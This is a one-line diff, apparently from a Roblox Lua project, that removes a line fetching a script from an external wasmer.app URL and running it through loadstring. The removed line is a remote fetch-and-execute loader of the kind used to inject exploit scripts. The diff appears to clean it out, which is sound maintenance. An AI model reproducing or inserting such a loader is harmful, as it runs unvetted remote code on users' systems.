@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://venxy.wasmer.app/raw/script-8ce20133"))()
